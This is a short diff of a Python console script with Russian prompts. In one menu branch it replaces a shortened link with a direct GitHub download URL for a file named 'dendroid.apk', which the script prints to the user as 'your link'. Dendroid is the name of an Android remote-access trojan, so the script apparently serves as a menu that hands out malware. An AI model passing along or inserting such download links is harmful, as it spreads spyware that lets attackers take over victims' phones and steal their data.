@@ -234,7 +234,7 @@ while True:
         os.system('clear')
         print(Fore.CYAN+' Ваша ссылка''\n')
         res()
-        print(Fore.GREEN+' https://bit.ly/3ild93L')
+        print(Fore.GREEN+' https://github.com/LOoLzeC/vcrt/raw/master/dendroid.apk')
         res()
         tru_901 = input('\n [Нажмите enter чтобы выйти]')
         os.system('clear')
